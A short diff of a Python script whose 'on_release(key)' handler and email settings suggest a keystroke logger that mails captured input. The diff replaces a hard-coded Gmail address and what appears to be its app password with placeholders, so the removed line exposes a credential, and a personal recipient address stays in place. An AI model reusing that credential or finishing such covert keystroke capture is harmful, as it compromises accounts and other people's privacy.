@@ -16,8 +16,8 @@ def on_release(key):
 
 
 def main():
-    sender_email = "hackerdhruv21@gmail.com"
-    sender_password = "igtfugpgnturgmwr"
+    sender_email = "Sender's email"
+    sender_password = "Sender's password"
 
     recipient_email = "dhruvtyagi01@gmail.com"
 
